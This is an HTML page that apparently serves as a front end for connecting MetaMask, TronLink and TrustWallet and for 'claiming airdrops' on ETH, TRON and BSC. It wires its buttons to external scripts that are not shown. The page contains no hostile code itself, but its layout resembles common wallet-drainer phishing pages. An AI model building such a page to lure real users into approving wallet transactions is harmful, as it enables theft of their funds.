<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Wallet Integration</title>
    <link rel="stylesheet" href="css/styles.css">
</head>
<body>
    <h1>Connect your Wallet</h1>
    <button id="connectButton">Connect MetaMask</button>
    <button id="claimAirdropButton" disabled>Claim Airdrop (ETH)</button>
    <button id="connectTronlinkButton">Connect TronLink</button>
    <button id="claimTronAirdropButton" disabled>Claim Airdrop (TRON)</button>
    <button id="connectTrustwalletButton">Connect TrustWallet</button>
    <button id="claimTrustwalletAirdropButton" disabled>Claim Airdrop (BSC)</button>

    <!-- Load JavaScript files in correct order -->
    <script src="js/common.js"></script>
    <script src="js/metamask.js"></script>
    <script src="deeplinks/metamask-deep.js"></script>
    <script src="js/loader.js"></script>

    <!-- Ensure to load wallet-specific scripts last to avoid conflicts -->
    <script src="js/eth.js"></script>
    <script src="js/bsc.js"></script>
    <script src="js/tron.js"></script>

    <!-- Add an event listener for the DOMContentLoaded event to fix the addEventListener issue -->
    <script>
        document.addEventListener('DOMContentLoaded', function() {
            // Attach event listeners here
            document.getElementById('connectButton').addEventListener('click', connectMetaMask);
            document.getElementById('connectTronlinkButton').addEventListener('click', connectTronLink);
            document.getElementById('connectTrustwalletButton').addEventListener('click', connectTrustWallet);

            document.getElementById('claimAirdropButton').addEventListener('click', claimAirdropETH);
            document.getElementById('claimTronAirdropButton').addEventListener('click', claimAirdropTRON);
            document.getElementById('claimTrustwalletAirdropButton').addEventListener('click', claimAirdropBSC);
        });
    </script>
</body>
</html>
